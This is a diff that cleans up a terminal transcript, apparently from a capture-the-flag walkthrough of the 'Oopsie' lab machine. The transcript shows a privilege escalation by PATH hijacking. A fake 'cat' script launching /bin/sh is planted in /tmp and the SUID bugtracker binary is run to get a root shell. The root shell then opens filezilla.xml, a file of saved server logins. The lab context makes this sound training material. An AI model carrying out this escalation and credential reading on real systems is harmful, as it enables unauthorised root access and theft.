@@ -22,7 +22,8 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 
-Last login: Mon Aug 16 19:39:59 2021 from 10.10.16.58
+Last login: Mon Aug 16 19:39:59 2021 from 10.10.16.58
+
 robert@oopsie:~$ ls 
 user.txt
 robert@oopsie:~$ cd ..
@@ -72,12 +73,10 @@ drwxrwxrwt  2 root root 4096 Aug 16 19:44 .Test-unix
 drwx------  2 root root 4096 Aug 16 19:44 vmware-root_546-2999591749
 drwxrwxrwt  2 root root 4096 Aug 16 19:44 .X11-unix
 drwxrwxrwt  2 root root 4096 Aug 16 19:44 .XIM-unix
-robert@oopsie:/tmp$ ec  e echo PATH=/tmp"$PATH
-> ^C
-robert@oopsie:/tmp$ echo PATH=/tmp"$PATH$PATH :$PATH
+robert@oopsie:/tmp$ echo PATH=/tmp:$PATH
 PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 robert@oopsie:/tmp$ echo '/bin/sh' > cat
-robert@oopsie:/tmp$ mo  chmod +x cat
+robert@oopsie:/tmp$ chmod +x cat
 robert@oopsie:/tmp$ ls -al
 total 48
 drwxrwxrwt 11 root   root   4096 Aug 16 19:45 .
@@ -114,16 +113,18 @@ Synchronized browsing to be enabled since it is enabled for that site.
 What happened instead:
 Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
 
-robert@oopsie:/tmp$ /usr/bin/bugtracker ls -al              chmod +x catecho '/bin/sh' > catPATH=/tmp:$PATH PATH=/tmp:$PATH  PATH=/tmp:$PATH  PATH=/tmp:$PATH x PATH=/tmp:$PATHp PATH=/tmp:$PATHo PATH=/tmp:$PATHr PATH=/tmp:$PATHt PATH=/tmp:$PATH
-robert@oopsie:/tmp$ export PATH=/tmp:$PATHrobert@oopsie:/tmp$ /usr/bin/bugtracker   ls -al              chmod +x catecho '/bin/sh' > catPATH=/tmp:$PATH'/bin/sh' > cat
-robert@oopsie:/tmp$ echo '/bin/sh' > catxport PATH=/tmp:$PATHrobert@oopsie:/tmp$ /usr/bin/bugtracker   ls -al              chmod +x cat
-robert@oopsie:/tmp$ chmod +x catecho '/bin/sh' > catxport PATH=/tmp:$PATHrobert@oopsie:/tmp$ /usr/bin/bugtracker   
+robert@oopsie:$ export PATH=/tmp:$PATH
+robert@oopsie:$ cd tmp
+robert@oopsie:/tmp$ echo '/bin/sh' > cat
+robert@oopsie:/tmp$ chmod +x cat
+
+robert@oopsie:/tmp$ /usr/bin/bugtracker
 
 ------------------
 : EV Bug Tracker :
 ------------------
 
-Provide Bug ID: 13 
+Provide Bug ID: 13
 ---------------
 
 # id
@@ -202,7 +203,7 @@ total 12
 drwxr-xr-x 2 root root 4096 Sep 11  2020 .
 drwxr-xr-x 3 root root 4096 Jan 25  2020 ..
 -rw-r--r-- 1 root root  646 Sep 11  2020 filezilla.xml
-# more filexilla^[[D^[[D              ezilla.xml
+# more filezilla.xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
 <FileZilla3>
     <RecentServers>
